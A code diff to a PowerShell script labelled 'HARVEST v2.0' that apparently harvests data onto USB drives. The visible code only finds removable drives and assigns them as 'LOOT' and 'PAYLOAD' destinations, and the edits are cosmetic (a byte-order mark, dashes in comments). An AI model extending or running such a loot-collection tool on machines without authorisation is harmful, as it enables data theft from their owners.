@@ -1,4 +1,4 @@
-<# ═══════════════════════════════════════════════════════════════════════
+﻿<# ═══════════════════════════════════════════════════════════════════════
    FLLC | FU PERSON | HARVEST v2.0
    ╔══════════════════════════════════════════════════════════════════╗
    ║  Zero-dependency. Pure PowerShell. One file does everything.     ║
@@ -30,7 +30,7 @@ try {
     }
 } catch {}
 
-# Find USB drives — look for removable drives
+# Find USB drives - look for removable drives
 $allDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
 $LOOT = $null
 $PAYLOAD_DRIVE = $null
@@ -55,7 +55,7 @@ if (-not $LOOT -or -not $PAYLOAD_DRIVE) {
         if (-not $LOOT) { $LOOT = $sorted[0].DeviceID }
         if (-not $PAYLOAD_DRIVE) { $PAYLOAD_DRIVE = $sorted[-1].DeviceID }
     } elseif ($sorted.Count -eq 1) {
-        # Single drive mode — dump loot on same drive
+        # Single drive mode - dump loot on same drive
         $LOOT = $sorted[0].DeviceID
         $PAYLOAD_DRIVE = $sorted[0].DeviceID
     }
